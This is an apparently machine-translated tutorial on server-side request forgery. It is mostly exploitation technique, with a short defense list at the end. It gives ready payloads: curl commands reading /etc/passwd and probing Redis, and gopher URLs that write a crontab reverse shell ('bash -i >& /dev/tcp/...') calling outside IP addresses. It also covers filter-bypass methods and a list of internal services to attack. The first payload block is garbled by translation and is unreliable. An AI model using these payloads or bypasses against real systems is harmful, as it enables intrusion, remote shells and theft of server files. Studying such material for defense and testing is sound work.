SSRF
========================================

Introduction
----------------------------------------
Server Side Request Forgery (SSRF) refers to an attacker using a server vulnerability to send a constructed request to the server's intranet as the server when he fails to obtain all the server's permissions. SSRF attacks usually target internal systems that are not directly accessible to external networks.

Vulnerability hazards
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SSRF can scan the ports of the external network, the intranet where the server is located, and the local area, attack applications running on the intranet or local area, or use the File protocol to read local files.

Intranet service defense is generally weaker than external network services. Some intranet services do not set permission verification for intranet access for convenience of operation and maintenance. Therefore, when SSRF exists, it usually causes great harm.

How to use
----------------------------------------
There are many forms and different scenarios for SSRF utilization, and different utilization and bypass methods can be used for different scenarios.

Taking curl as an example, you can use the dict protocol to operate Redis, file protocol reading files, gopher protocol rebound shell and other functions. Common Payloads are as follows:

::

Curl -VVV 'Dict: //127.0.0.1: 6379/info'

curl -vvv 'file:///etc/passwd'

# * Note: The link uses single quotes to avoid $ variable issues

curl -vvv 'Gopher: //127.0.0.1: 6379/_*1%0d%0A $ 8%0D%0DFLUSHALL%0D%0D%0A*3%0D%0d%0a $ 3%0D%0D%0D%0D $ 1%0D%0A1%0D% 0A $ 64%0D%0A%0D%0A%0A%0A */1 * * * * BASH -i> & /dev/tcp/103.21.140.84/6789 0> & 1%0a%0a%0A%0A%0A%0D%0A%0D%0D%0A%0D%0A*4%0D%0D $ 6%0D%0CONFIG%0D%0D%0A $ 3%0D%0D%0D%0D%0D%0A $ 3 %0D%0adir%0D%0A $ 16%0D%0A/WER/SPOOL/CRON/%0D %0A*4%0D%0A $ 6%0D%0ACONFIG%0D%0A $ 3%0D%0D%0D%0D%0A $ 10%0D%0DBFILENAME%0D%0D%0A $ 4%0D%0D%0D%0D%0A*1%0D%0a $ 4%0D%0Asave%0D%0AQUIT%0D%0A '

Related hazard functions
----------------------------------------
The dangerous functions involved in SSRF are mainly network access and support pseudo-protocol network reading. Taking PHP as an example, the functions involved include ``file_get_contents()``/`fsocopen()``/`curl_exec()``, etc.

Filter bypass
----------------------------------------

Change the IP address writing method
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Some developers will filter out the intranet IP by regular matching of the passed URL parameters, such as the following regular expression:

- ``^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$``
- ``^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$``
- ``^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$``

For this filtering, we use the method of adapting the IP to bypass it. For example, the IP address 192.168.0.1 can be rewritten as:

- Eight-digit format: 0300.0250.0.1
- Hexadecimal format: 0xC0.0xA8.0.1
- Decimal integer format: 3232235521
- Hexadecimal integer format: 0xC0A80001
- Merge the last two digits: 1.1.278 / 1.1.755
- Merge the last three digits: 1.278/1.755/3.14159267

In addition, each bit in the IP can be mixed with each bit.

When accessing the rewritten IP address, Apache will report 400 Bad Request, but other services such as Nginx and MySQL can still work normally.

In addition, the IP 0.0.0.0 can be accessed directly to the local area and is usually missed by regular filtering.

Use domain names that resolve to the intranet
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
If the server does not first resolve the IP and then filter the intranet address, we can use localhost and other fields to resolve the domain name of the intranet.

In addition, ``xip.io`` provides a convenient service. The subdomain of this website will be parsed to the corresponding IP, such as 192.168.0.1.xip.io, and resolved to 192.168.0.1.

Problems arising from parsing URLs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
In some cases, the backend program may parse the accessed URL and filter the parsed host address. At this time, improper parsing of URL parameters may occur, resulting in the filtering being bypassed.

For example, ``http://www.baidu.com@192.168.0.1/`` When the backend program passes incorrect regular expressions (such as the character content after http to com, that is, www.baidu.com, When parsing the content of the above URL, it is very likely that the host that accesses the URL is www.baidu.com, but in fact, the content requested by this URL is on 192.168.0.1 content.

Use jump
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
If the backend server correctly parses the URL host and filters it after receiving the parameters, we can use jump to bypass it.

You can use services such as http://httpbin.org/redirect-to?url=http://192.168.0.1, but since the URL contains an intranet IP address such as 192.168.0.1, it may be expressed regularly. filtering out can be bypassed by short addresses.

Commonly used jumps include 302 jumps and 307 jumps. The difference is that 307 jumps will forward the data in the POST request, etc., but 302 jumps will not.

Through various non-HTTP protocols
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
If the server-side program verifies the protocol used to access the URL, it can be utilized through the non-HTTP protocol.

For example, through gopher, POST or GET requests can be constructed in a url parameter to achieve the purpose of attacking intranet applications. For example, you can use the gopher protocol to attack Redis services with the intranet, and you can use the following URL:

::

gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i >& /dev/tcp/172.19.23.228/23330>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a

In addition to the gopher protocol, the File protocol is also a commonly used protocol in SSRF. This protocol is mainly used to access files in the local computer. We can access the computer locality through a format like ``file:///path/to/file`` document. Using the file protocol can avoid filtering of the accessed IP by the server program. For example, we can access the content of 1.txt on D disk through ``file:///d:/1.txt``.

DNS Rebinding
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
A common protection idea is: for the URL parameters requested by the user, the server will first perform DNS resolution on it, and then judge the IP address returned by the DNS server. If it is on the blacklist, the request will be prohibited.

However, during the whole process, there is a time difference between requesting the DNS service for the first time for domain name resolution to the second server to request the URL. Using this time difference, a DNS rebinding attack can be carried out.

To complete the DNS rebinding attack, we need a domain name and specify the resolution of this domain name to our own DNS Server, write a resolution service on our controllable DNS Server, and set the TTL time to 0. This way you can attack, the complete attack process is:

- The server side obtains URL parameters, performs the first DNS resolution, and obtains an IP that is not an intranet
- For judgment on the obtained IP, if it is found to be a non-blacklist IP, it will pass verification
- The server side accesses the URL. Since the TTL set by the DNS server is 0, DNS resolution is performed again. This time the DNS server returns the intranet address.
- Since verification has been bypassed, the server side returns the result of accessing intranet resources.

With the continuous development of DNS Rebinding technology, there are also some new attack methods:

- Reply multiple IP requests at the same time in one response, including public and intranet IPs
- For the case where the browser requests both A and AAAA records, first reply to the legal IPv6 address, and then reply to the intranet IPv4 address after a period of time

Use IPv6
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Some services do not consider IPv6, but the intranet supports IPv6, so you can use the local IP of IPv6 such as ``[::]``` ``0000::1`` or the intranet domain name of IPv6 to bypass filtering.


Usage IDN
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Some network access tools such as Curl support internationalized Domain Name (IDN). Internationalized domain names are also called special character domain names, which refer to Internet domain names composed of partially or completely special characters or letters.

Among these characters, some characters will make an equivalent conversion when accessed, for example ``ⓔⓧⓐⓐⓜⓟⓛⓔ.ⓒⓞⓜ`` is equivalent to ``example.com``. In this way, characters such as ``① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩`` can be used to bypass the intranet restrictions.

Possible points of utilization
----------------------------------------

Intranet service
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Apache Hadoop remote command execution
- axis2-admin deployment server command execution
- Confluence SSRF
- counchdb WEB API remote command execution
- dict
- docker API remote command execution
- Elasticsearch engine Groovy script command execution
- ftp/ftps (FTP blasting)
- Indirect command execution of glassfish arbitrary file reading and war file deployment
- gopher
- HFS remote command execution
- http、https
- imap/imaps/pop3/pop3s/smtp/smtps (explosive email username and password)
- Java debugging interface command execution
- JBOSS remote Invoker war command execution
- Jenkins Scripts interface command execution
- ldap
- mongodb
- php_fpm/fastcgi command execution
- rtsp - smb/smbs (connect to SMB)
- sftp
- ShellShock command execution
- Struts2 command execution
- telnet
- tftp (UDP protocol extension)
- Tomcat command execution
- WebDav PUT uploads any file
- WebSphere Admin can deploy war indirect command execution
- zentoPMS remote command execution

Redis Utilization
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Write ssh public key
- Write crontab
- Write WebShell
- Windows write startup item
- Master-slave copy loading .so files
- Master-slave copy and write lossless files

Cloud host
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
In cloud environments such as AWS and Google, by accessing the metadata API or management API of the cloud environment, sensitive information and other effects can be achieved in some cases.

Defense method
----------------------------------------
- Filter the returned information
- Unified error message
- Restrict requested ports
- Prohibit uncommonly used protocols
- For DNS Rebinding, consider using DNS cache or Host whitelist

Reference link
----------------------------------------
- `SSRF vulnerability analysis and utilization <http://www.91ri.org/17111.html>`_
- `A New Era Of SSRF <https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf>`_
- `php ssrf technique <https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51>`_
- `Talk about how to reject SSRF vulnerability in Python development <https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html>`_
- `SSRF Tips <http://blog.safebuff.com/2016/07/03/SSRF-Tips/>`_
- `SSRF in PHP <https://joychou.org/web/phpssrf.html>`_
